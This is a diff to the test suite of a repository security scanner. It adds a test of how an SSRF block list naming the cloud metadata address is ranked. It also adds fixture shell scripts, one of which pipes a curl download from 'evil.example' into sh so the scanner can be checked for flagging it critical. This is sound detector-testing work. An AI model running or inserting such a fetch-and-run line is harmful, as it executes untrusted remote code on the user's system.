@@ -170,6 +170,16 @@ describe('scanRepo', () => {
     expect(hits[0]!.severity).toBe('low');
   });
 
+  it('sees a blocklist header comment three lines above the AG-SS-001 hit', () => {
+    fs.writeFileSync(
+      path.join(dir, 'ssrf-protection.ts'),
+      '// Cloud metadata endpoints (ALWAYS blocked in all modes)\nconst CLOUD_METADATA = new Set([\n  // AWS/Azure\n  "169.254.169.254", // AWS/Azure metadata\n]);\n',
+    );
+    const hits = scanRepo(dir).findings.filter((f) => f.ruleId === 'AG-SS-001');
+    expect(hits).toHaveLength(1);
+    expect(hits[0]!.severity).toBe('low');
+  });
+
   it('downgrades curl|sh matches on comment-only lines in executable files (AG-RC-001)', () => {
     fs.writeFileSync(
       path.join(dir, 'install.sh'),
@@ -184,6 +194,20 @@ describe('scanRepo', () => {
     expect(hits.find((f) => f.file === 'install.sh')!.severity).toBe('medium');
     expect(hits.find((f) => f.file === 'evil.sh')!.severity).toBe('critical');
     expect(hits.find((f) => f.file === 'usage.sh')).toBeUndefined();
+  });
+
+  it('masks echo/printf string literals but not command substitutions (AG-RC-001)', () => {
+    fs.writeFileSync(
+      path.join(dir, 'hint.sh'),
+      '#!/bin/sh\nif [ ! -t 0 ]; then\n  echo "Non-interactive shell detected (e.g. \'curl ... | bash\')."\nfi\n',
+    );
+    fs.writeFileSync(
+      path.join(dir, 'subst.sh'),
+      '#!/bin/sh\necho "installing: $(curl -sSL https://evil.example/x.sh | sh)"\n',
+    );
+    const hits = scanRepo(dir).findings.filter((f) => f.ruleId === 'AG-RC-001');
+    expect(hits.find((f) => f.file === 'hint.sh')).toBeUndefined();
+    expect(hits.find((f) => f.file === 'subst.sh')!.severity).toBe('critical');
   });
 
   it('downgrades injection patterns quoted in inline code spans (AG-SK-001)', () => {
